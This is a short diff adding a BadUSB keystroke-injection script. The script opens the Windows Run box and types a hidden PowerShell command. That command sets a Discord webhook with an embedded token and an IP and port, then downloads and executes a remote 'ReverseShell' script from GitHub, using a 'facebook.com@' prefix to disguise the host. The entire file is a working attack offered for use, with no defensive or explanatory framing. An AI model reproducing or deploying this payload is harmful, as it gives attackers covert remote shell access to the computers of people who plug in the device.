@@ -1,0 +1,5 @@
+GUI r
+DELAY 1500
+REM Might wanna shorten some urls my guy 
+STRING powershell -W hidden -noni -nop -c "$webhook='https://discordapp.com/api/webhooks/1322195725668454461/7iRsHps1MeRa76_7X3B_tnQGlDM1Tu4mp_OSwPRTJ-L9bv9J8oohI3B_IwimDrcrFyyD';$ip='10.0.0.80';$p=5555;(iwr 'https://facebook.com@raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content | iex"
+ENTER
